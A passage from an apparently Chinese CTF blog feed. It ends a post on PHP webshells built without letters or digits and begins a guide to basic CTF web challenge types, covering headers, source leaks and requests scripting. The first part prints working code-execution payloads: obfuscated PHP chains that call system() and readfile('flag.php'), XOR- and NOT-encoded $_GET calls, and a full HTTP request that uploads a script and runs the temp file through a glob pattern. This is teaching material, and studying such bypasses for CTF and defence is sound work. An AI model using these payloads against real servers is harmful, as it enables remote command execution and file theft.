operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意：</strong>执行的时候要进行一次 URL 编码，否则 Payload 无法执行。</p><h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了_</h3><ul><li>```php<br>${ %ff%ff%ff%ff^%a0%b8%ba%ab}{ %ff}();&amp; %ff=phpinfo<br>即:<br>${_GET}{ %ff}();&amp;%ff=phpinfo<br>//?shell=${_GET}{ %ff}();&amp; %ff=phpinfo<pre class="line-numbers language-none"><code class="language-none">任何字符与 0xff 异或都会取相反，这样就能减少运算量了。注意：测试中发现，传值时对于要计算的部分不能用括号括起来，因为括号也将被识别为传入的字符串，可以使用 `{}` 代替，原因是 PHP 的 use of undefined constant 特性。例如 `${_GET}{a}` 这样的语句 PHP 是不会判为错误的，因为 `{}` 是用来界定变量的，这句话就是会将 `_GET` 自动看为字符串，也就是 `$_GET['a']`。`${_GET}{%ff}` 后面那个 `()` 为的是能够动态执行传入的 PHP 函数。同理，如果想要执行代函数的函数比如 `system('whoami')`，那我们可以对后面括号里的参数做相同的编码处理：```php${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&amp;%ff=system${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&amp;%ff=readfile${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&amp;%ff=highlight_file// 即: // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('whoami');&amp;%ff=system// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&amp;%ff=readfile// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&amp;%ff=highlight_file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>或者，我们也可以直接进行取反：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">{</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token constant">BA</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span><span class="token class-name type-declaration">phpinfo</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token constant">BA</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">90</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>```go<br>?&gt;<!--?=`{${~"%a0%b8%ba%ab"}[%a0]}`?--><pre class="line-numbers language-none"><code class="language-none">分析下这个Payload，?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~"%a0%b8%ba%ab"为"_GET"，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。**PHP 中的反引号**PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：相关例题：[PingPingPing](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)### 过滤了分号 `;`**PHP 短标签**我们最常见的 PHP 标签就是 `&lt;?php ?&gt;` 了，但是 PHP 中还有两种短标签，即 `&lt;? ?&gt;` 和 `&lt;?= ?&gt;` 。当关键字 “php” 被过滤了之后，此时我们便不能使用 `&lt;?php ?&gt;` 了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号 `;` 。其中，`&lt;? ?&gt;` 相当于对 `&lt;?php ?&gt;` 的替换。而 `&lt;?= ?&gt;` 则是相当于 `&lt;?php echo ... ?&gt;` 。例如：```php&lt;?='Hello World'?&gt;    // 输出 "Hello World"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>PHP 短标签中的代码不需要写分号，所以我们直接把所有的 PHP 语句改成短标签形式就行了。</p><h3 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了 $"></a>过滤了 <code>$</code></h3><p><strong>PHP 7</strong></p><p><img src="https://i.loli.net/2021/08/05/2NrKdtVHfIy6G9m.png"></p><p>PHP 7 前是不允许用 <code>($a)();</code> 这样的方法来执行动态函数的，但 PHP 7 中增加了对此的支持。所以，我们可以通过 <code>('phpinfo')();</code> 的形式来执行函数，第一个括号中可以是任意 PHP 7 表达式。</p><p><strong>PHP 5</strong></p><p>在 PHP 5 中如果我们还使用 <code>('phpinfo')();</code> 这样的 PHP 表达式则会得到一个报错，原因就是 PHP 5 并不支持这种表达方式。所以，如果也过滤了 <code>$</code> 的话，对于 PHP 5 环境的利用方法就很复杂了。</p><p>先介绍两个两个有趣的Linux shell知识点：</p><ol><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ol><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到错误，这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，如果在未执行到我们的文件的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p><strong>深入理解glob通配符</strong></p><p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”</p><p>利用这个通配符我们可以排除掉含有特殊字符的文件 </p><p><strong>[]</strong></p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p><p>PHP生成的临时文件包含大写字母。我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p>最后我们可以采用的 Payload 是：</p><pre class="line-numbers language-none"><code class="language-none">. /???/????????[@-[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后给出一个payload</p><pre class="line-numbers language-none"><code class="language-none">POST /?shell=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?&gt; HTTP/1.1Host: 192.168.43.210:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type:multipart/form-data;boundary=--------123Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 109----------123Content-Disposition:form-data;name="file";filename="1.txt"#!/bin/shls /----------123--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关例题：</p><p><a href="http://120.55.164.48/challenges#r2/ezssrf-3">**r2/ezssrf</a>**</p><p><strong>[2021 津门杯 CTF]hate_php</strong></p><blockquote><p>参考：****</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://xz.aliyun.com/t/8107#toc-13">https://xz.aliyun.com/t/8107#toc-13</a></p><p><a href="https://xz.aliyun.com/t/7742#toc-8">https://xz.aliyun.com/t/7742#toc-8</a></p><p><a href="https://xz.aliyun.com/t/9387">https://xz.aliyun.com/t/9387</a></p><p><a href="https://whoamianony.top/2021/07/20/Web%E5%AE%89%E5%85%A8/%E8%80%81%E7%94%9F%E5%B8%B8%E8%B0%88%E7%9A%84%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%20Webshell/#post-comment">https://whoamianony.top/2021/07/20/Web%E5%AE%89%E5%85%A8/%E8%80%81%E7%94%9F%E5%B8%B8%E8%B0%88%E7%9A%84%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%20Webshell/#post-comment</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web基础总结</title>
      <link href="/2021/08/04/web-ji-chu-zong-jie/"/>
      <url>/2021/08/04/web-ji-chu-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web基本题型及其解题方法"><a href="#CTF-Web基本题型及其解题方法" class="headerlink" title="CTF-Web基本题型及其解题方法"></a>CTF-Web基本题型及其解题方法</h1><h3 id="第1大类-基础知识类题目"><a href="#第1大类-基础知识类题目" class="headerlink" title="第1大类-基础知识类题目"></a>第1大类-基础知识类题目</h3><ol><li> <strong>查看网页源码</strong></li></ol><p>   火狐可以通过ctrl+u查看源代码，或者直接F12，通常做题时都会先查看源代码，寻找里面是否有隐藏的信息。</p><ol start="2"><li><p><strong>发送HTTP请求</strong></p><p>对于get请求，直接在url中输入即可  例：xxx.xxx.xx.xxx?a=1</p><p>对于post请求，可以使用 hackba r(maxhackbar) ,load入url后，勾选post data，然后传入你想传的值。</p></li></ol><hr><h3 id="第2大类-HTTP头相关的题目"><a href="#第2大类-HTTP头相关的题目" class="headerlink" title="第2大类-HTTP头相关的题目"></a>第2大类-HTTP头相关的题目</h3><ol><li><p><strong>查看响应头</strong></p><p><img src="https://i.loli.net/2021/08/04/DfqGUXzAEicnxSJ.png"></p><table><thead><tr><th>Allow</th><th>服务器支持哪些请求方法（如GET、POST等）。</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td></tr><tr><td>Content-Length</td><td>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入  ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td></tr><tr><td>Content-Type</td><td>表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td></tr><tr><td>Date</td><td>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td></tr><tr><td>Server</td><td>服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td></tr><tr><td>Last-Modified</td><td>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td></tr><tr><td>Location</td><td>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td></tr></tbody></table><p>有时候响应头里会有hint（提示）或者题目的关键信息，也有的时候会直接把flag放在响应头里给你.</p></li><li><p><strong>修改请求头、伪造Cookie</strong></p><p>常见的有set-cookie、XFF和Referer，总之考法很灵活，做法比较固定，知道一些常见的请求头再根据题目随机应变就没问题了。</p><p>基本就是使用bp抓包，然后进行修改。</p><p>XFF：当出现localhost，本地字样的时候，一般都需要抓包修改X-Forwarded-For为127.0.0.1</p><p>Referer：当出现需从哪一个网址访问时，一般需要抓包修改referer为该网址</p><p>User-agent：需要修改访问该网站的浏览器时更改</p><p>accept language：当要求以特定语言访问时修改</p><p>cookie：根据题目提示伪造cookie，稍微简单点的题目的话就是cookie:login=0改为login=1</p></li></ol><hr><h3 id="第3大类-源码泄露"><a href="#第3大类-源码泄露" class="headerlink" title="第3大类-源码泄露"></a>第3大类-源码泄露</h3><p>flag一般在源码的某个文件里，但也有和其他知识结合、需要进一步利用的情况.</p><ol><li><p><strong>SVN源码泄露</strong></p><p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p><p>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p><p>工具：<strong>SvnHack</strong>，<strong>dvcs-ripper</strong></p><p>github项目地址:<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p></li><li><p><strong>git源码泄露</strong></p><p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>工具：githack，dvcs-ripper</p><p>github项目地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></li><li><p><strong>hg源码泄露</strong></p><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg文件</p><p>工具：dvcs-ripper</p><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p></li><li><p><strong>cvs漏洞泄露</strong></p><p>CVS是一个C/S系统，是一个常用的代码版本控制软件。主要在开源软件管理中使用。与它相类似的代码版本控制软件有subversion。多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。CVS版本控制系统是一种GNU软件包，主要用于在多人开发环境下的源码的维护。但是由于之前CVS编码的问题，大多数软件开发公司都使用SVN替代了CVS。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。<br> <a href="http://url/CVS/Root">http://url/CVS/Root</a> 返回根信息<br> <a href="http://url/CVS/Entries">http://url/CVS/Entries</a> 返回所有文件的结构</p><p>工具：dvcs-ripper</p><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p></li><li><p><strong>.DS_Store泄露</strong></p><p>.DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>工具：ds_store_exp</p><p>github项目地址:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p>相关例题：buu 假猪套天下第一</p></li><li><p><strong>Bazaar/bzr泄露</strong></p><p>Bazaar（bzr）是另一个开源的 DVCS（Distributed Version Control System，即分布式版本控制系统），它试图给 SCM（Source Code Management，即源码管理） 的世界里带来一些新的东西。<br>bzr 是 Canonical 公司支持的一个项目，也就是 Ubuntu Linux 的发行公司。简单来说，bzr 是用 python 编写的，用于版本控制。</p></li><li><h6 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a><strong>网站备份压缩文件</strong></h6><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。</p><pre class="line-numbers language-none"><code class="language-none">.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常可以通过后台扫描器扫描出</p><p>工具：dirsearch-master，御剑</p></li><li><p><strong>WEB-INF/web.xml 泄露</strong></p><p>WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF 主要包含一下文件或目录：</p><pre class="line-numbers language-none"><code class="language-none">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。</p><p>例题：buu上有一道easy java需要利用</p></li><li><p><strong>SWP 文件泄露</strong></p><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。</p><p>漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p><p>第一次临时退出的时候产生的时swp，第二次为swo，第三次为swm，以此类推</p></li><li><p><strong>GitHub源码泄露</strong></p><p>GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</p><p>github常见搜索语法：</p><pre class="line-numbers language-none"><code class="language-none">in:name test               #仓库标题搜索含有关键字 SpringCloudin:descripton test         #仓库描述搜索含有关键字in:readme test             #Readme文件搜素含有关键字stars:&gt;3000 test           #stars数量大于3000的搜索关键字stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字forks:&gt;1000 test           #forks数量大于1000的搜索关键字forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字user:test                  #用户名搜素license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字language:java test         #在java语言的代码中搜索关键字user:test in:name test     #组合搜索,用户名test的标题含有test的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="第4大类-Python爬虫信息处理"><a href="#第4大类-Python爬虫信息处理" class="headerlink" title="第4大类-Python爬虫信息处理"></a>第4大类-Python爬虫信息处理</h3><p>这类题目一般都是给一个页面，页面中有算式或者是一些数字，要求在很短的时间内求出结果并提交，如果结果正确就可以返回flag</p><p>因为所给时间一般都很短而且计算比较复杂，所以只能写脚本。这种题目的脚本一般都需要用到requests库</p><ul><li><h6 id="发送-GET-请求与-POST-请求"><a href="#发送-GET-请求与-POST-请求" class="headerlink" title="发送 GET 请求与 POST 请求"></a>发送 GET 请求与 POST 请求</h6></li></ul><p>以 Github 官网为例，对其发起 GET 请求;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对其发起 POST 请求：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><h6 id="查看请求头"><a href="#查看请求头" class="headerlink" title="查看请求头"></a>查看请求头</h6></li></ul><p>对 Github 官网发起请求，以查看 GET 请求的请求头为例，POST 请求同理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">{</span><span class="token 